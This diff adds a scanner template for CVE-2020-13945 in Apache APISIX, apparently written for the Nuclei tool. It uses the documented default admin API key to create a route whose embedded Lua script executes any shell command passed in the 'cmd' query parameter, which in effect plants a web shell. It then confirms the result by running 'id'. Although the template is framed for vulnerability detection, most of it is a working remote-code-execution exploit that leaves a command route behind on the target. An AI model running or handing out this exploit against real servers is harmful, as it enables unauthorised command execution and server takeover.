@@ -1,0 +1,57 @@
+id: CVE-2020-13945
+info:
+  name: Apache APISIX Admin API Default Access Token
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Apache APISIX has a default key vulnerability allowing attackers to access
+    APISIX management data, upload malicious scripts, execute arbitrary commands,
+    and potentially take over server permissions.
+  classification:
+    cve-id: CVE-2020-13945
+  reference:
+    - https://lists.apache.org/thread.html/r792feb29964067a4108f53e8579a1e9bd1c8b5b9bc95618c814faf2f%40%3Cdev.apisix.apache.org%3E
+  remediation: |
+    Set access policies and whitelist access through security devices such as
+    firewalls. If not necessary, prohibit public network access to the system.
+
+variables:
+  random_path: "{{rand_base(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /apisix/admin/routes HTTP/1.1
+        Host: {{Hostname}}
+        X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
+        Content-Type: application/json
+
+        {
+          "uri": "/{{random_path}}",
+          "script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
+          "upstream": {
+            "type": "roundrobin",
+            "nodes": {
+              "example.com:80": 1
+            }
+          }
+        }
+
+    matchers:
+      - type: status
+        status:
+          - 201
+
+  - raw:
+      - |
+        GET /{{random_path}}?cmd=id HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "uid=\\d+"
